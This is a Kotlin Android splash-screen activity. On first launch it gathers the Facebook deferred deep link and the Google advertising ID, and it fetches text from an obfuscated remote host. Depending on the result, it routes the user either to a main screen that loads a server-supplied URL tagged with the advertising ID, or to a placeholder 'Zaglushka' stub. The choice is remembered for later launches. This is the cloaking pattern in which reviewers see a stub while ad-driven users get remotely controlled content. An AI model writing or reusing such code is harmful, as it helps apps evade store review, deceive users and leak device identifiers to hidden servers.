package com.elisym.bigtise.elysiumrise.topic.handful.rise

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.elisym.bigtise.elysiumrise.R
import com.elisym.bigtise.elysiumrise.ZaglushkaActivity
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import com.onesignal.OneSignal
import com.elisym.bigtise.elysiumrise.topic.handful.rise.AppClass.Companion.li
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.jsoup.Jsoup
import java.io.IOException
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

@SuppressLint("CustomSplashScreen")
class SplashScreenActivity : AppCompatActivity() {
    private val PREFS_NAME = "MyPrefsFile"
    private val KEY_FIRST_TIME = "firstTime"
    private val KEY_FIRST_ACTIVITY = "firstActivity"
    val nk = ".shop/Ww2b7N"
    val nk2 = ".site/Y7PNY8"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val sharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

        CoroutineScope(Dispatchers.Main).launch {
            val deepLink = handleDeferredDeepLink()
            val gaid = withContext(Dispatchers.IO) {
                    getGoogleAdvertisingId()
            }
            val text = withContext(Dispatchers.Main){
                val url = "$li$nk2"
                fetchText(url)
            }

            val combinedData = when {
                deepLink != null && gaid != null -> "$li$nk?c=$deepLink&ad=$gaid"
                deepLink != null && gaid == null-> "$li$nk?c=$deepLink"
                else -> null
            }

            val intent: Intent = if (isFirstTime(sharedPreferences)) {
                saveFirstTimeFlag(sharedPreferences)
                if (deepLink != null) {
                    OneSignal.login(gaid.toString())
                    saveFirstActivity(sharedPreferences, MainActivity::class.java)
                    Intent(this@SplashScreenActivity, MainActivity::class.java).apply {
                        putExtra("combinedData", combinedData)
                    }
                } else {
                    if (text?.isNotEmpty() == true) {
                        saveFirstActivity(sharedPreferences, MainActivity::class.java)
                        Intent(this@SplashScreenActivity, MainActivity::class.java).apply {
                            putExtra("combinedData", "$text?ad=$gaid")

                        }
                    } else {
                        saveFirstActivity(sharedPreferences, ZaglushkaActivity::class.java)
                        Intent(this@SplashScreenActivity, ZaglushkaActivity::class.java)
                    }
                }
            } else {
                val firstActivity = getFirstActivity(sharedPreferences)
                Intent(this@SplashScreenActivity, firstActivity)
            }

            startActivity(intent)
            overridePendingTransition(0, 0)
            finish()

        }
    }

    private suspend fun handleDeferredDeepLink(): String? = suspendCoroutine { continuation ->
        AppLinkData.fetchDeferredAppLinkData(this@SplashScreenActivity) { appLinkData: AppLinkData? ->
            val deepLink = appLinkData?.targetUri?.host
            continuation.resume(deepLink)
        }
    }

    private suspend fun getGoogleAdvertisingId(): String? = suspendCoroutine { continuation ->
        try {
            val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(this)
            val gaid = adInfo.id
            continuation.resume(gaid)
        } catch (e: IOException) {
            continuation.resume(null)
        } catch (e: GooglePlayServicesNotAvailableException) {
            continuation.resume(null)
        } catch (e: GooglePlayServicesRepairableException) {
            continuation.resume(null)
        }
    }
    private suspend fun fetchText(url: String): String? {
        return withContext(Dispatchers.IO) {
            fetchTextInBackground(url)
        }
    }

    private fun fetchTextInBackground(url: String): String? {
        try {
            val doc = Jsoup.connect(url).get()
            return doc.body().text()
        } catch (e: IOException) {
            e.printStackTrace()

        }
        return null
    }


    private fun isFirstTime(sharedPreferences: SharedPreferences): Boolean {
        return sharedPreferences.getBoolean(KEY_FIRST_TIME, true)
    }

    private fun saveFirstTimeFlag(sharedPreferences: SharedPreferences) {
        val editor = sharedPreferences.edit()
        editor.putBoolean(KEY_FIRST_TIME, false)
        editor.apply()
    }

    private fun saveFirstActivity(sharedPreferences: SharedPreferences, activityClass: Class<*>) {
        val editor = sharedPreferences.edit()
        editor.putString(KEY_FIRST_ACTIVITY, activityClass.name)
        editor.apply()
    }

    private fun getFirstActivity(sharedPreferences: SharedPreferences): Class<*>? {
        val activityName = sharedPreferences.getString(KEY_FIRST_ACTIVITY, null)
        return try {
            activityName?.let { Class.forName(it) }
        } catch (e: ClassNotFoundException) {
            null
        }
    }
}
